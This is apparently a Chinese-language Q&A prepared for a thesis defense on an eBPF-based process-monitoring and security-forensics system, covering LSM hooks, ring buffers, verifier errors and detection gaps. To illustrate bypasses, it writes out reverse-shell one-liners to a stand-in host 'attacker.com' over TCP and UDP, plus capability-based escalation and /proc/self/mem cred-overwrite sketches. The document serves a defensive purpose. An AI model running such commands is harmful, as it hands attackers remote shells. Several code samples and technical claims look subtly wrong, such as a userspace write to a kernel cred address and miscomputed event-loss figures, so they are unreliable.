# eBPF 进程监控与安全取证系统 - 本科毕业答辩 Q&A 文档

## 目录
- [一、eBPF 内核态相关问题 (40题)](#一ebpf-内核态相关问题-40题)
- [二、Agent 和 Server 实现相关问题 (40题)](#二agent-和-server-实现相关问题-40题)
- [三、风险分析和评分算法 (30题)](#三风险分析和评分算法-30题)
- [四、系统架构和设计问题 (30题)](#四系统架构和设计问题-30题)
- [五、性能和优化问题 (20题)](#五性能和优化问题-20题)
- [六、安全性和防御绕过问题 (20题)](#六安全性和防御绕过问题-20题)
- [七、代码实现细节和边界情况 (20题)](#七代码实现细节和边界情况-20题)

---

## 一、eBPF 内核态相关问题 (40题)

### 1. 你的 eBPF 程序在 trace_execve 钩子中使用了 bpf_probe_read_kernel 来读取 cred 结构,但为什么不使用 bpf_get_current_uid_gid() 一次性获取 UID/GID?

**答案:**
`bpf_get_current_uid_gid()` 只能获取当前进程的 uid 和 gid,但无法获取 euid(有效用户ID)和 egid(有效组ID)。在 eBPF 中,判断 setuid 程序的关键是检测 `euid != uid`,这需要分别获取 uid 和 euid。因此,我必须通过 `bpf_probe_read_kernel` 读取 `cred` 结构来获取完整的权限信息。

代码实现:
```c
__u64 uid_gid = bpf_get_current_uid_gid();
__u32 uid = uid_gid & 0xFFFFFFFF;
__u32 gid = uid_gid >> 32;

// 然后单独读取 euid 和 egid
struct cred *cred;
bpf_probe_read_kernel(&cred, sizeof(cred), &task->cred);
bpf_probe_read_kernel(&euid, sizeof(euid), &cred->euid.val);
bpf_probe_read_kernel(&egid, sizeof(egid), &cred->egid.val);
```

---

### 2. 你提到使用 LSM 钩子比 tracepoint 更早捕获权限变更,但 task_fix_setuid LSM 钩子在内核哪个具体位置触发?请画出调用栈。

**答案:**
`task_fix_setuid` LSM 钩子在内核的 `sys_setuid` 系统调用执行过程中,在 `prepare_creds()` 和 `commit_creds()` 之间触发。调用栈如下:

```
sys_setuid
  └─> ksys_setuid
       └─> prepare_creds()  // 准备新的 cred 结构
            └─> security_task_fix_setuid()  [LSM 钩子在此触发]
                 └─> task_fix_setuid()  [我的 eBPF 程序]
       └─> commit_creds()  // 提交新的 cred 结构
```

LSM 钩子的优势在于它在权限真正生效之前就被调用,可以在权限变更的决策阶段进行拦截和监控。

---

### 3. 为什么你的 file_permission LSM 钩子被注释掉了?如果启用它,会带来什么性能问题?如何优化?

**答案:**
`file_permission` LSM 钩子被禁用的原因是:

1. **性能问题**: 这个钩子会在**每次文件访问**时触发,包括读取、写入、执行等操作。在高负载系统中,每秒可能产生数万次文件访问,会导致:
   - Ring Buffer 快速填满
   - 用户空间处理延迟增加
   - CPU 使用率显著上升

2. **噪声过多**: 大多数文件访问是正常的,会产生大量低价值事件

**优化方案:**
1. **增加过滤条件**: 只监控敏感目录和敏感文件类型
2. **降低采样率**: 使用概率采样(如每10次只记录1次)
3. **使用 Perf Event Array 替代 Ring Buffer**: Perf Event Array 更适合高频事件
4. **分级处理**: 在内核态进行初步过滤,只传递高风险事件

代码中的实现:
```c
SEC("lsm/file_permission")
int BPF_PROG(handle_file_permission, struct file *file, int mask) {
    // 只检查写入操作 (MAY_WRITE = 2)
    if (!(mask & 2)) {
        return 0;
    }
    // 简化:暂时禁用文件监控,专注于权限提升检测
    return 0;
}
```

---

### 4. 你的 eBPF 程序只监控 euid != uid 的 setuid 程序,但这会漏掉什么类型的提权?请举例说明。

**答案:**
这种监控策略会漏掉以下提权类型:

1. **基于 Linux Capabilities 的提权**:
   ```bash
   # 如果进程有 CAP_SETUID 能力,不需要 setuid 位
   sudo setcap cap_setuid+ep /tmp/exploit
   /tmp/exploit  # 可以调用 setuid(0) 提权
   ```

2. **通过 Sudo 提权**:
   ```bash
   sudo su  # sudo 本身是 setuid 程序,但子进程可能不是
   ```

3. **通过 PAM 模块提权**:
   ```bash
   # 恶意 PAM 模块可以在认证后执行任意代码
   ```

4. **通过内核漏洞提权**:
   ```bash
   # 利用内核漏洞直接修改 current->cred
   ```

5. **通过环境变量注入**:
   ```bash
   # LD_PRELOAD 劫持,在共享库中调用 setuid(0)
   ```

**改进方案:**
监控所有以 root 权限执行的进程(euid == 0),无论是否为 setuid 程序:
```c
__u8 is_root_program = (euid == 0) ? 1 : 0;
__u8 is_priv_escalation = is_setuid_program || is_root_program;
```

---

### 5. handle_task_fix_setuid 中读取 mm->exe_file->f_path->dentry->d_name.name 的路径获取逻辑为什么不直接使用 ctx->args[0]?

**答案:**
因为 `task_fix_setuid` 是 LSM 钩子,它的函数签名是:
```c
int BPF_PROG(handle_task_fix_setuid, struct task_struct *task, struct cred *new, struct cred *old)
```

它**没有** `ctx->args[0]` 参数(这是 tracepoint 钩子的特征)。LSM 钩子只接收 `task_struct`、新旧 `cred` 等参数,不包含系统调用的参数。

因此,我必须通过以下路径获取可执行文件名:
```
task_struct → mm_struct → file_struct → path → dentry → d_name.name
```

代码实现:
```c
struct mm_struct *mm;
struct file *exe_file;
struct path exe_path;
struct dentry *dentry;
const unsigned char *d_name;

if (bpf_probe_read_kernel(&mm, sizeof(mm), &task->mm) == 0 && mm != NULL) {
    if (bpf_probe_read_kernel(&exe_file, sizeof(exe_file), &mm->exe_file) == 0) {
        // ... 继续读取路径
    }
}
```

---

### 6. 你的 ring buffer 大小设置为 256KB,如果系统每秒产生 10000 个事件,会发生什么?如何动态调整?

**答案:**
每个 `process_event` 结构体大小约为 400 字节:
- 基础字段: ~200 字节
- 路径字段: 256 字节(最大)
- 网络字段: ~20 字节

**计算:**
- Ring Buffer 容量: 256KB = 262,144 字节
- 每个事件: ~400 字节
- 可存储事件数: 262,144 / 400 ≈ **655 个事件**

**每秒 10000 个事件的后果:**
1. 事件丢失率: (10000 - 655) / 10000 ≈ **93.45%**
2. Ring Buffer 快速填满
3. `bpf_ringbuf_reserve()` 失败,新事件被丢弃

**动态调整方案:**
1. **增大 Ring Buffer 大小**:
```c
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 2 * 1024 * 1024);  // 2MB
} events SEC(".maps");
```

2. **实现自适应采样率**:
```c
// 在用户态监控 ring buffer 使用率
// 根据使用率调整采样率
static volatile int sampling_rate = 1;  // 1 = 全部采样, 10 = 每10个采样1个

if (bpf_get_prandom_u32() % sampling_rate != 0) {
    return 0;  // 跳过此事件
}
```

3. **使用多个 Ring Buffer**: 按事件类型分流

4. **用户态背压控制**: 当 ring buffer 快满时,通知 Agent 减少事件发送频率

---

### 7. 为什么你只在 LSM 钩子中获取可执行文件路径,而不在 tracepoint 中获取?两者的区别是什么?

**答案:**
实际上,我在两个钩子中都获取了路径,但方法不同:

| 钩子类型 | 路径获取方法 | 优点 | 缺点 |
|---------|------------|------|------|
| **Tracepoint** (sys_enter_execve) | `ctx->args[0]` | 简单直接,性能好 | 只在 execve 时可用 |
| **LSM** (task_fix_setuid) | `task->mm->exe_file->f_path` | 可在任何时候获取进程可执行文件路径 | 复杂,多次内存读取,性能差 |

**代码对比:**

Tracepoint (简单):
```c
const char *filename_ptr = (const char *)ctx->args[0];
bpf_probe_read_user_str(filename, sizeof(filename), filename_ptr);
```

LSM (复杂):
```c
struct mm_struct *mm;
struct file *exe_file;
struct dentry *dentry;
// 需要 5-6 次 bpf_probe_read_kernel 调用
```

**为什么在 LSM 中也获取路径?**
因为 LSM 钩子可能在进程执行**之后**触发,此时 `ctx->args[0]` 已经不可用。通过 `task->mm->exe_file` 可以随时获取进程的可执行文件路径。

---

### 8. 你在 trace_execve 中检测 euid != uid 来识别 setuid 程序,但如果一个进程使用了 cap_setuid 能力怎么办?你的系统能检测吗?

**答案:**
当前系统**可以检测**这种情况,但不够精确。

**情况分析:**
当一个进程有 `CAP_SETUID` 能力时,它可以调用 `setuid(0)` 提权,此时:
- `uid` = 原始用户ID (如 1000)
- `euid` = 0 (root)

我的检测逻辑:
```c
__u8 is_setuid_program = (euid != uid) ? 1 : 0;
__u8 is_root_program = (euid == 0) ? 1 : 0;
__u8 is_priv_escalation = is_setuid_program || is_root_program;
```

**问题:**
这个逻辑会**误报**。例如:
- Root 用户执行普通命令:`uid=0, euid=0` → `is_root_program=1` → 被标记为提权
- 实际上这只是正常的 root 操作,不是提权

**改进方案:**
在 `trace_execve` 中,应该检测**真实的提权**:
```c
// 只检测从普通用户提升到 root
if (uid != 0 && euid == 0) {
    is_real_privilege_escalation = 1;
}

// 或者检测文件是否有 setuid 位
// (需要额外的文件系统检查)
```

---

### 9. 你的 get_ppid() 函数使用 real_parent 而不是 parent,这两者有什么区别?在什么情况下会不同?

**答案:**
`real_parent` 和 `parent` 的区别:

| 字段 | 含义 | 使用场景 |
|-----|------|---------|
| `real_parent` | 创建当前进程的父进程 | 用于时间线重建、进程树分析 |
| `parent` | 当前进程的调试父进程 | 被 `ptrace` 时会指向调试器 |

**不同情况:**

1. **正常情况**:
```c
bash (PID 1000) → fork() → ls (PID 1001)
real_parent = 1000 (bash)
parent = 1000 (bash)
```

2. **被 ptrace 调试时**:
```c
gdb (PID 2000) → ptrace(ls)
real_parent = 1000 (bash)
parent = 2000 (gdb)
```

3. **进程被守护进程收养**:
```c
父进程退出 → init (PID 1) 收养
real_parent = 1 (init)
parent = 1 (init)
```

**代码实现:**
```c
static __inline __u32 get_ppid() {
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    struct task_struct *parent;
    
    // 使用 real_parent 获取真实的父进程
    if (bpf_probe_read_kernel(&parent, sizeof(parent), &task->real_parent) != 0) {
        return 0;
    }
    
    __u32 ppid;
    if (bpf_probe_read_kernel(&ppid, sizeof(ppid), &parent->tgid) != 0) {
        return 0;
    }
    
    return ppid;
}
```

**为什么选择 `real_parent`?**
因为我在做时间线重建和进程分析,需要知道真实的父子关系,而不是调试关系。

---

### 10. 你为什么使用 bpf_probe_read_kernel_str 读取文件名而不是 bpf_probe_read_kernel?两者的内存访问模式有什么不同?

**答案:**
两者的区别:

| 函数 | 特点 | 适用场景 |
|-----|------|---------|
| `bpf_probe_read_kernel` | 读取固定长度的二进制数据 | 读取结构体、整数等 |
| `bpf_probe_read_kernel_str` | 读取以 `\0` 结尾的字符串 | 读取文件名、路径等字符串 |

**内存访问模式差异:**

1. **`bpf_probe_read_kernel`**:
```c
char filename[256];
bpf_probe_read_kernel(filename, sizeof(filename), ptr);
// 读取完整的 256 字节,包括未初始化的内存
// 可能读取到垃圾数据
```

2. **`bpf_probe_read_kernel_str`**:
```c
char filename[256];
bpf_probe_read_kernel_str(filename, sizeof(filename), ptr);
// 只读取到 `\0` 为止
// 自动处理字符串终止符
// 更安全,不会读取越界
```

**代码中的使用:**
```c
// 读取文件路径 - 使用 _str 版本
const char *filename_ptr = (const char *)ctx->args[0];
char filename[MAX_FILENAME_LEN] = {0};
bpf_probe_read_user_str(filename, sizeof(filename), filename_ptr);

// 读取结构体 - 使用普通版本
struct cred *cred;
bpf_probe_read_kernel(&cred, sizeof(cred), &task->cred);
```

**为什么用 `_str`?**
1. 文件名长度不固定,从几个字符到 255 字符
2. `_str` 版本会自动在 `\0` 处停止,不会越界
3. 更安全,verifier 更容易通过

---

### 11. 如果攻击者通过 /proc/self/mem 修改了自己的 cred 结构,你的 LSM 钩子还能检测到吗?为什么?

**答案:**
**不能检测到**。

**原因分析:**

1. **`/proc/self/mem` 的工作原理**:
   - 通过 `mmap` 映射进程内存
   - 使用 `ptrace` 或 `/proc/pid/mem` 接口
   - 直接修改内存,不经过系统调用

2. **LSM 钩子的触发时机**:
   - LSM 钩子只在**系统调用**或**内核函数**触发时执行
   - 直接修改内存**不会触发任何 LSM 钩子**

3. **修改 cred 结构的影响**:
```c
// 攻击者代码
int fd = open("/proc/self/mem", O_RDWR);
lseek(fd, (off_t)&current->cred, SEEK_SET);
write(fd, new_cred, sizeof(new_cred));  // 直接修改内存
// 此时 euid 已经变为 0,但 LSM 钩子未被触发
```

**检测方法:**
1. **监控 `/proc/*/mem` 访问**:
```c
SEC("tracepoint/syscalls/sys_enter_write")
int trace_write_mem(struct trace_event_raw_sys_enter *ctx) {
    // 检查是否写入 /proc/*/mem
    // 检查目标地址是否在 cred 结构范围内
}
```

2. **监控 ptrace 系统调用**:
```c
SEC("tracepoint/syscalls/sys_enter_ptrace")
int trace_ptrace(struct trace_event_raw_sys_enter *ctx) {
    // 检测 PTRACE_POKEDATA 等修改内存的请求
}
```

3. **定期验证 cred 一致性**:
   - 使用另一个 eBPF 程序定期检查进程的 uid/euid
   - 如果发现 uid != 0 但 euid == 0,可能被篡改

---

### 12. 你的 eBPF 程序中使用了大量的 __builtin_memcpy,为什么不使用 bpf_probe_read_kernel?

**答案:**
实际上,我在代码中**两者都使用了**,但场景不同:

**`__builtin_memcpy` 的使用场景:**
1. **复制已知安全的内存**:
```c
// 从已经通过 bpf_probe_read_kernel 读取的数据中复制
__builtin_memcpy(event->filename, filename, sizeof(event->filename));
```

2. **初始化内存**:
```c
__builtin_memset(event->filepath, 0, sizeof(event->filepath));
```

**`bpf_probe_read_kernel` 的使用场景:**
1. **从内核空间读取可能不安全的内存**:
```c
struct cred *cred;
bpf_probe_read_kernel(&cred, sizeof(cred), &task->cred);
bpf_probe_read_kernel(&euid, sizeof(euid), &cred->euid.val);
```

**为什么有时用 `__builtin_memcpy`?**
1. **性能**: `__builtin_memcpy` 是编译器内置函数,会被内联,性能更好
2. **verifier 通过**: verifier 知道 `__builtin_memcpy` 的行为,更容易验证
3. **已知安全源**: 当源数据已经通过安全检查后,可以使用快速复制

**最佳实践:**
```c
// 不安全 - 直接复制内核内存
__builtin_memcpy(&event->uid, &task->cred->uid.val, sizeof(__u32));

// 安全 - 先读取,再复制
struct cred *cred;
bpf_probe_read_kernel(&cred, sizeof(cred), &task->cred);
__u32 uid;
bpf_probe_read_kernel(&uid, sizeof(uid), &cred->uid.val);
event->uid = uid;
```

---

### 13. 你监控了 openat 系统调用,但为什么不监控 open 和 creat?这两者在现代 Linux 系统中的关系是什么?

**答案:**
**现代 Linux 中,`open` 和 `creat` 实际上都调用 `openat`**。

**历史演变:**

1. **早期 UNIX**:
   - `open(path, flags, mode)` - 打开文件
   - `creat(path, mode)` - 创建文件(相当于 `open(path, O_WRONLY|O_CREAT|O_TRUNC, mode)`)

2. **Linux 2.6.39+**:
   - 引入 `openat(dirfd, path, flags, mode)`
   - 解决 TOCTOU(Time-of-Check-Time-of-Use) 竞争条件
   - 提供原子性的目录+文件操作

3. **glibc 实现**:
```c
// glibc 中 open 的实现
int open(const char *pathname, int flags, mode_t mode) {
    return syscall(SYS_openat, AT_FDCWD, pathname, flags, mode);
}

// glibc 中 creat 的实现
int creat(const char *pathname, mode_t mode) {
    return syscall(SYS_openat, AT_FDCWD, pathname,
                   O_WRONLY|O_CREAT|O_TRUNC, mode);
}
```

**为什么只监控 `openat`?**
1. **覆盖所有情况**: 监控 `openat` 可以捕获所有文件打开操作
2. **避免重复**: 不需要同时监控三个系统调用
3. **性能**: 减少需要附加的 tracepoint 数量

**验证方法:**
```bash
# 查看 open 系统调用的实际实现
strace -e open,openat,creat ls

# 输出:
# openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
# openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
```

---

### 14. 你的 trace_connect 函数检测反向 shell 时只检查进程名,如果攻击者把 bash 重命名成其他名字怎么办?

**答案:**
这是一个**绕过漏洞**,攻击者可以通过以下方式绕过:

```bash
# 重命名 bash
cp /bin/bash /tmp/myapp
/tmp/myapp -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# 或者使用符号链接
ln -s /bin/bash /tmp/legitimate_tool
/tmp/legitimate_tool -c '...'
```

**改进方案:**

1. **检测 ELF 可执行文件的真实路径**:
```c
// 读取 exe_file 获取真实路径
struct mm_struct *mm;
struct file *exe_file;
// ... 读取真实可执行文件路径
// 检查是否为 /bin/bash, /bin/sh 等
```

2. **检测 shell 特征行为**:
```c
// 检测从标准输入读取命令的行为
// 检测环境变量(如 SHELL, PS1)
// 检测终端相关的系统调用
```

3. **组合检测规则**:
```c
__u8 is_reverse_shell = 0;

// 规则1: 进程名匹配
if (is_shell_comm(comm)) {
    is_reverse_shell = 1;
}

// 规则2: 可执行文件是 shell
if (is_shell_exe(exe_path)) {
    is_reverse_shell = 1;
}

// 规则3: 有网络连接 + 终端特征
if (has_network_conn && has_terminal_features) {
    is_reverse_shell = 1;
}
```

4. **使用进程特征指纹**:
```c
// 综合进程的多个特征
// - 可执行文件路径
// - 打开的文件描述符
// - 环境变量
// - 内存映射
```

**代码实现示例:**
```c
// 检测是否为真实的 shell 可执行文件
static __inline __u8 is_shell_exe(const char *exe_path) {
    if (bpf_probe_read_kernel_str(...)) {
        // 检查路径
        if (path_starts_with(exe_path, "/bin/bash") ||
            path_starts_with(exe_path, "/bin/sh") ||
            path_starts_with(exe_path, "/usr/bin/bash")) {
            return 1;
        }
    }
    return 0;
}
```

---

### 15. 你如何确保 eBPF 程序的 verifier 通过?遇到过哪些 verifier 失败的情况?

**答案:**
**eBPF Verifier 的要求:**
1. 所有内存访问必须经过边界检查
2. 不允许未初始化的变量
3. 循环必须有固定的上限
4. 不允许递归
5. 所有的指针必须是有效的

**遇到的 Verifier 失败情况:**

1. **未检查指针是否为 NULL**:
```c
// 失败 - 可能导致崩溃
struct task_struct *parent = task->real_parent;
__u32 ppid = parent->tgid;

// 修复 - 添加 NULL 检查
struct task_struct *parent;
if (bpf_probe_read_kernel(&parent, sizeof(parent), &task->real_parent) != 0) {
    return 0;
}
if (parent == NULL) {
    return 0;
}
```

2. **未初始化的栈变量**:
```c
// 失败
char filename[256];
bpf_probe_read_user_str(filename, sizeof(filename), ptr);
// verifier 报错: 可能读取未初始化的内存

// 修复
char filename[256] = {0};  // 初始化为 0
```

3. **循环边界不确定**:
```c
// 失败
for (int i = 0; i < len; i++) {  // len 是运行时值
    // verifier 无法确定循环次数
}

// 修复
#pragma unroll
for (int i = 0; i < 16; i++) {  // 固定循环次数
    // ...
}
```

4. **字符串操作超出边界**:
```c
// 失败
if (filename[i] == '/') {  // 可能越界
    // ...
}

// 修复
for (int i = 0; i < MAX_PATH_LEN - 1; i++) {
    if (filename[i] == '\0' || filename[i] == '/') {
        break;
    }
}
```

5. **辅助函数调用限制**:
```c
// 失败 - 辅助函数调用次数超过限制(1M 次)
bpf_get_current_comm(&event->comm, sizeof(event->comm));
bpf_get_current_comm(&event->comm, sizeof(event->comm));
// ... 太多次调用

// 修复 - 缓存结果
char comm[TASK_COMM_LEN];
bpf_get_current_comm(comm, sizeof(comm));
__builtin_memcpy(event->comm, comm, sizeof(event->comm));
```

**验证通过的技巧:**
1. 使用 `bpf_probe_read_kernel` 包装所有内核内存访问
2. 所有数组访问前检查边界
3. 初始化所有栈变量
4. 使用 `#pragma unroll` 展开小循环
5. 避免复杂的控制流

---

### 16. 为什么你在 LSM 钩子中设置 event->ppid = 0?这会对时间线重建造成什么影响?

**答案:**
**这是代码中的一个疏忽**,应该修复。

**问题代码:**
```c
// 在 handle_task_fix_setuid 中
event->ppid = 0;  // ❌ 错误
```

**正确做法:**
```c
event->ppid = get_ppid();  // ✅ 正确
```

**影响分析:**

1. **时间线重建问题**:
   - `ppid = 0` 会被解释为没有父进程
   - 进程树重建时会断链
   - 无法追踪提权来源

2. **进程关联分析失败**:
   - 无法找到提权命令的发起者
   - 无法构建完整的攻击链
   - 取证报告的准确性下降

3. **前端显示问题**:
   - UI 显示 "无父进程"
   - 用户无法理解事件的上下文

**为什么会出现这个问题?**
1. **LSM 钩子参数限制**: `task_fix_setuid` 钩子的签名中没有直接的父进程信息
2. **实现疏忽**: 忘记调用 `get_ppid()` 函数
3. **测试不足**: 没有充分测试时间线重建功能

**修复方案:**
```c
SEC("lsm/task_fix_setuid")
int BPF_PROG(handle_task_fix_setuid, struct task_struct *task, struct cred *new, struct cred *old) {
    // ... 其他代码 ...

    event->ppid = get_ppid();  // 修复: 获取真实的父进程 PID

    // ... 其他代码 ...
}
```

---

### 17. 你的 is_sensitive_file 检测使用了硬编码的字符串比较,如果路径超过 MAX_PATH_LEN 怎么办?

**答案:**
**当前实现会截断路径,可能导致误报或漏报。**

**问题分析:**

```c
#define MAX_PATH_LEN 256

char filename[MAX_PATH_LEN] = {0};
bpf_probe_read_user_str(filename, sizeof(filename), filename_ptr);

// 如果实际路径是:
// "/very/long/path/that/exceeds/256/characters/etc/passwd"
// 读取后可能变成:
// "/very/long/path/that/exceeds/256/charac"
```

**影响:**
1. **漏报**: 敏感文件路径被截断,无法检测
2. **误报**: 截断后的路径可能匹配错误

**解决方案:**

1. **增加 MAX_PATH_LEN**:
```c
#define MAX_PATH_LEN 4096  // Linux PATH_MAX = 4096
```

2. **使用前缀匹配**:
```c
// 不需要完整路径,只检查前缀
if (filename[0] == '/' && filename[1] == 'e' && filename[2] == 't' &&
    filename[3] == 'c' && filename[4] == '/' && filename[5] == 'p' &&
    filename[6] == 'a' && filename[7] == 's' && filename[8] == 's' &&
    filename[9] == 'w' && filename[10] == 'd') {
    target_file_type = FILE_PASSWD;
}
```

3. **使用 bpf_loop 进行逐字符比较**:
```c
static __inline __u8 path_starts_with(const char *path, const char *prefix, __u32 prefix_len) {
    __u8 match = 1;
    bpf_loop(prefix_len, NULL, NULL, NULL);
    // 逐字符比较
    for (__u32 i = 0; i < prefix_len; i++) {
        char c;
        if (bpf_probe_read_kernel(&c, sizeof(c), &path[i]) != 0) {
            return 0;
        }
        if (c != prefix[i]) {
            return 0;
        }
    }
    return 1;
}
```

4. **使用 Map 存储敏感路径模式**:
```c
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 100);
    __type(key, char[64]);  // 路径前缀
    __type(value, __u8);   // 文件类型
} sensitive_paths SEC(".maps");
```

**最佳实践:**
```c
// 组合方法: 前缀匹配 + 长度检查
#define MAX_PATH_LEN 4096
#define PATH_PREFIX_LEN 128

char filename[MAX_PATH_LEN];
bpf_probe_read_user_str(filename, sizeof(filename), filename_ptr);

// 只检查前 N 个字符
if (filename[0] == '/' && filename[1] == 'e' && /* ... */) {
    // 匹配前 128 个字符就足够
    target_file_type = FILE_PASSWD;
}
```

---

### 18. 为什么你在 trace_connect 中设置 protocol = 6(TCP)硬编码?UDP 连接怎么办?

**答案:**
**这是一个实现缺陷,当前代码只处理 TCP 连接。**

**问题代码:**
```c
event->protocol = 6; // TCP - 硬编码
```

**问题分析:**

1. **UDP 反向 Shell 也存在**:
```bash
# UDP 反向 shell
nc -u -l -p 4444  # 攻击者监听 UDP
bash -i >& /dev/udp/attacker.com/4444 0>&1
```

2. **当前实现无法检测 UDP 连接**

**修复方案:**

1. **从 socket 结构体获取协议类型**:
```c
SEC("tracepoint/syscalls/sys_enter_connect")
int trace_connect(struct trace_event_raw_sys_enter *ctx) {
    struct socket *sock;
    struct sock *sk;
    __u16 protocol;

    // 获取 socket 结构体
    int sockfd = ctx->args[0];
    sock = bpf_sock_from_file(sockfd);  // 需要辅助函数

    // 读取协议类型
    if (sock) {
        sk = sock->sk;
        bpf_probe_read_kernel(&protocol, sizeof(protocol), &sk->sk_protocol);
    } else {
        // 从地址族推断
        struct sockaddr *addr = (struct sockaddr *)ctx->args[1];
        __u16 family;
        bpf_probe_read_kernel(&family, sizeof(family), &addr->sa_family);

        if (family == AF_INET) {
            protocol = 6;  // TCP (默认假设)
        } else if (family == AF_INET6) {
            protocol = 6;  // TCP
        }
    }

    event->protocol = protocol;
}
```

2. **监控 sendto/recvfrom 系统**:
```c
// UDP 连接使用 sendto/recvfrom,不使用 connect
SEC("tracepoint/syscalls/sys_enter_sendto")
int trace_sendto(struct trace_event_raw_sys_enter *ctx) {
    // 检测 UDP 数据发送
    // 分析目标地址和端口
}
```

3. **综合检测策略**:
```c
// TCP: connect 系统调用
// UDP: sendto/recvfrom 系统调用
// 检测 shell 进程的网络活动,无论协议类型
```

**改进后的代码:**
```c
// 检测反向 shell,不依赖协议类型
if (is_reverse_shell(comm)) {
    // TCP 或 UDP,都是高风险
    score += 40;
}
```

---

### 19. 你的 eBPF 程序在读取内核结构体时使用了多次 bpf_probe_read_kernel,为什么不一次性读取整个结构体?

**答案:**
这是一个**安全性和性能的权衡**问题。

**为什么不一次性读取?**

1. **结构体可能跨页边界**:
```c
struct cred {
    // ... 大量字段,可能跨越多个内存页
    atomic_t usage;
    uid_t uid;
    uid_t euid;
    // ...
};

// 如果 cred 结构体跨越页面边界
// bpf_probe_read_kernel(&cred_struct, sizeof(cred_struct), ptr) 可能失败
```

2. **避免读取敏感数据**:
```c
// 一次性读取可能访问到不应该访问的内存
bpf_probe_read_kernel(&task_struct, sizeof(task_struct), task_ptr);
// 可能读取到进程的私有数据
```

3. **减少 verifier 验证复杂度**:
```c
// 读取少量数据,verifier 更容易验证
bpf_probe_read_kernel(&euid, sizeof(euid), &cred->euid.val);

// vs 读取整个结构体
bpf_probe_read_kernel(&cred_struct, sizeof(cred_struct), cred_ptr);
// verifier 需要验证整个结构体的访问模式
```

4. **性能考虑**:
```c
// 只读取需要的字段,减少内存访问
bpf_probe_read_kernel(&euid, sizeof(euid), &cred->euid.val);
bpf_probe_read_kernel(&egid, sizeof(egid), &cred->egid.val);

// vs 读取整个结构体(几百字节)
bpf_probe_read_kernel(&cred_struct, sizeof(cred_struct), cred_ptr);
```

**什么时候可以一次性读取?**

1. **结构体很小且已知安全**:
```c
struct task_struct *task;
bpf_probe_read_kernel(&task, sizeof(task), &task_ptr);
// task_struct 很大,但通常在单页内
```

2. **需要多个字段**:
```c
// 如果需要 5+ 个字段,一次性读取更高效
struct user_namespace *ns;
bpf_probe_read_kernel(&ns, sizeof(ns), &cred->user_ns);
```

**最佳实践:**
```c
// 策略1: 按需读取(推荐)
__u32 euid;
bpf_probe_read_kernel(&euid, sizeof(euid), &cred->euid.val);

// 策略2: 分块读取
struct {
    uid_t uid;
    uid_t euid;
    uid_t suid;
    uid_t fsuid;
} ids;
bpf_probe_read_kernel(&ids, sizeof(ids), &cred->uid);

// 策略3: 使用局部变量缓存
struct cred local_cred;
if (bpf_probe_read_kernel(&local_cred, sizeof(local_cred), cred) == 0) {
    euid = local_cred.euid.val;
    egid = local_cred.egid.val;
}
```

---

### 20. 如果系统有多个 eBPF 程序都在监控 execve,你的程序和其他程序如何共存?会有冲突吗?

**答案:**
**eBPF 程序可以共存,不会冲突。**

**eBPF 的设计原则:**

1. **每个程序独立运行**:
```c
// 程序 A
SEC("tracepoint/syscalls/sys_enter_execve")
int program_a_execve(struct trace_event_raw_sys_enter *ctx) {
    // A 的逻辑
    return 0;
}

// 程序 B
SEC("tracepoint/syscalls/sys_enter_execve")
int program_b_execve(struct trace_event_raw_sys_enter *ctx) {
    // B 的逻辑
    return 0;
}

// 两个程序会都执行,互不干扰
```

2. **各自使用独立的 Map**:
```c
// 程序 A 的 Map
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events_a SEC(".maps");

// 程序 B 的 Map
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 512 * 1024);
} events_b SEC(".maps");
```

3. **返回值不影响其他程序**:
   - Tracepoint 程序的返回值**不传递给内核**
   - LSM 程序的返回值**会影响系统行为**,需要协调

**共存策略:**

1. **使用不同的程序名**:
```c
// 程序 A
SEC("tracepoint/syscalls/sys_enter_execve/monitor")
int monitor_execve(...) { }

// 程序 B
SEC("tracepoint/syscalls/sys_enter_execve/audit")
int audit_execve(...) { }
```

2. **使用命名空间**:
```c
// 在用户态加载时指定命名空间
link.Tracepoint("syscalls", "sys_enter_execve", prog, &link.TracepointOptions{
    Cookie: []byte("my_monitor"),
})
```

3. **协调 LSM 程序**:
```c
// LSM 程序需要协调返回值
// 程序 A: 只监控,返回 0
int program_a_lsm(...) {
    // 记录事件
    return 0;  // 允许操作
}

// 程序 B: 实施访问控制
int program_b_lsm(...) {
    if (should_deny) {
        return -EACCES;  // 拒绝操作
    }
    return 0;
}
```

**潜在问题:**

1. **性能影响**:
   - 多个程序同时执行会增加开销
   - 每个 execve 调用可能触发 10+ 个 eBPF 程序

2. **资源竞争**:
   - Ring Buffer 大小有限
   - 多个程序可能竞争 CPU

3. **事件重复**:
   - 用户空间可能收到重复事件
   - 需要去重

**最佳实践:**
```c
// 1. 程序标识
#define PROGRAM_ID 0x1234
event->program_id = PROGRAM_ID;

// 2. 去重
// 在用户态基于 program_id + timestamp + pid 去重

// 3. 优先级
// LSM 程序应该协调,避免冲突
```

---

### 21. 你为什么不使用 eBPF maps 存储进程历史,而只使用 ring buffer?

**答案:**
这是一个**架构设计选择**,各有优劣。

**Ring Buffer 的优势:**

1. **简单高效**:
```c
// 直接写入,无需管理
event = bpf_ringbuf_reserve(&events, sizeof(*event), 0);
if (event) {
    // 填充事件
    bpf_ringbuf_submit(event, 0);
}
```

2. **低延迟**:
   - 事件立即传递到用户空间
   - 不需要额外的查询操作

3. **适合流式处理**:
   - 事件按时间顺序流动
   - 用户空间实时处理

**eBPF Maps 的优势:**

1. **持久化存储**:
```c
// 事件持久化在内核态
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 10000);
    __type(key, __u32);  // pid
    __type(value, struct process_history);
} process_history SEC(".maps");
```

2. **支持查询**:
```c
// 可以查询历史事件
struct process_history *history = bpf_map_lookup_elem(&process_history, &pid);
if (history) {
    // 分析历史行为
}
```

3. **关联分析**:
```c
// 可以跨事件关联
// 例如: 检测进程的提权历史
```

**为什么不使用 Maps?**

1. **复杂度增加**:
```c
// 需要管理 Map 生命周期
// 需要清理过期数据
// 需要处理 Map 满的情况
```

2. **内存限制**:
```c
// Map 大小有限制
// 每个进程的历史可能很大
```

